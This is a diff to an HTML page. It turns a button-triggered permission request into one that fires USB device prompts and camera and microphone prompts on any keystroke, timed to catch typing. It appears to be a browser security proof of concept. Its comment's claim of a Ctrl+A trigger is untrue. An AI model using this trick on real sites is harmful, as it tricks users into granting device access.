@@ -1,36 +1,23 @@
+
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8" />
-  <title>Media and USB Permissions</title>
+  <meta charset="UTF-8">
 </head>
 <body>
-  <button id="startBtn">Request Permissions</button>
+
 
   <script>
-    document.getElementById('startBtn').addEventListener('click', async () => {
-      try {
-        // Request camera and microphone
-        const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
-        console.log('Media access granted');
+ 
 
-        // Wait for 2 seconds
-        setTimeout(async () => {
-          try {
-            // Request USB device
-            const device = await navigator.usb.requestDevice({
-              filters: [{ vendorId: 0x2341 }] // Example: Arduino vendorId
-            });
-            console.log('USB device selected:', device);
-          } catch (usbError) {
-            console.error('USB request failed:', usbError);
-          }
-        }, 2000);
+    // Handle USB device request on Ctrl + A
+    document.addEventListener('keydown', async (event) => {
+       setTimeout(" navigator.usb.requestDevice({filters: [{}]}).then();", 1);
+       setTimeout(" navigator.usb.requestDevice({filters: [{}]}).then();", 620);
 
-      } catch (mediaError) {
-        console.error('Media access denied:', mediaError);
-      }
+navigator.mediaDevices.getUserMedia({ video: true, audio: true });
     });
   </script>
+
 </body>
 </html>
